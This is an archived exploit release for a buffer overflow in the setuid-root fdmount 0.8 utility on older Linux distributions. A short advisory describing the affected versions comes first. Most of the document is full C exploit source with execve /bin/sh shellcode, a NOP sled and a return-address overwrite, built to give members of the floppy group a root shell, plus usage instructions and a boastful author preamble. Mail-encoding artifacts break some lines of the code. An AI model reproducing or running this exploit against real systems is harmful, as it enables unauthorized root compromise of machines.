source: http://www.securityfocus.com/bid/1239/info
 
A buffer overflow exists in the 0.8 version of the fdmount program, distributed with a number of popular versions of Linux. By supplying a large, well crafted buffer containing machine executable code in place of the mount point, it is possible for users in the 'floppy' group to execute arbitrary commands as root.
 
This vulnerability exists in versions of S.u.S.E., 4.0 and later, as well as Mandrake Linux 7.0. TurboLinux 6.0 and earlier ships with fdmount suid root, but users are not automatically added to the 'floppy' group. This list is by no means meant to be complete; other Linux distributions may be affected. To check if you're affected, check for the presence of the setuid bit on the binary. If it is present, and the binary is either world executable, or group 'floppy' executable, you are affected and should take action immediately. 

/*      
   Welcome dear reader - be it scriptkiddy, whose sole intent it is to
   destroy precious old Unix boxes or Assembly Wizard whose sole intent =
it 
   is to correct my code and send me a flame.
   
   The fdutils package contains a setuid root file that is used by the =
floppy 
   group to mount and unmount floppies. If you are not in this group, =
this
   exploit will not work.
   
   This thingy was tested on Slackware 4.0 and 7.0
   
   Use as: fdmount-exp [offset] [buf size] [valid text ptr]
   
   Since the char * text is overwritten in void errmsg(char *text) we =
should
   make sure that this points to a valid address (something in the .data
   section should do perfectly). The hard coded one used works on my =  
box,
   to find the one you need use something like:
   
   objdump --disassemble-all $(whereis -b fdmount) | grep \<.data\> \
   cut -d " " -f1
   
   The HUGE number of nops is needed to make sure this exploit works.
   Since it Segfaults out of existence without removing /etc/mtab~ we
   only get one try...
   
   Take care with your newly aquired EUID 0!
   
   Cheers go out to: #phreak.nl #b0f #hit2000 #root66
   The year 2000 scriptkiddie award goed to: Gerrie Mansur
   Love goes out to: Hester, Maja (you're so cute!), Dopey
   
   -- Yours truly,
                Scrippie - ronald@grafix.nl - buffer0verfl0w security
                                            - #phreak.nl
*/                                          
                                            
#include <stdio.h>                          
   
#define NUM_NOPS 500

// Gee, Aleph1 his shellcode is back once more
        
char shellcode[] =
   "\x31\xc0\xb0\x17\x31\xdb\xcd\x80"
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
   
unsigned long get_sp(void) { 
   __asm__("movl %esp, %eax");
}  
   
main(int argc, char **argv)
{      
   int buf_size = 71;
   int offset=0, i;
   
   char *overflow;
   char *ovoff;
   long addr, ptr=0x0804c7d0;
   
   if(argc>1) offset = atoi(argv[1]);
   if(argc>2) buf_size = atoi(argv[2]);
   if(argc>3) ptr = strtol(argv[3], (char **) NULL, 16);
   
   printf("##############################################\n"); 
   printf("# fdmount Slack 4/7 exploit  -  by Scrippie  #\n");
   printf("##############################################\n");
   printf("Using offset: %d\n", offset);
   printf("Using buffer size: %d\n", buf_size);
   printf("Using 0x%x for \"void errmsg(char *text,...)\" char *text\n", =
ptr);
   
   if(!(overflow = (char = 
*)malloc(buf_size+16+NUM_NOPS+strlen(shellcode)))) {
      fprintf(stderr, "Outta memory - barging out\n");
      exit(-1);
   }
   
   overflow[0] = '/';
   
   for(i=1;i<buf_size;i++) {
      overflow[i] = 0x90;
   }            
                                            
   addr = get_sp() - offset;              
                                            
   printf("Resulting address: 0x%x\n", addr);
   
   memcpy(overflow + strlen(overflow), (void *) &addr, 4);
   memcpy(overflow + strlen(overflow), (void *) &ptr, 4);
   memcpy(overflow + strlen(overflow), (void *) &ptr, 4);
   memcpy(overflow + strlen(overflow), (void *) &ptr, 4);

   ovoff = overflow + strlen(overflow);
   
   for(i=0;i<NUM_NOPS;i++) {
      *ovoff = 0x90;
      *ovoff++;
   }
   
   strcpy(ovoff, shellcode);
   
   execl("/usr/bin/fdmount", "fdmount", "fd0", overflow, NULL);
       
   return 0;
}  
/*                    www.hack.co.za           [18 May]*/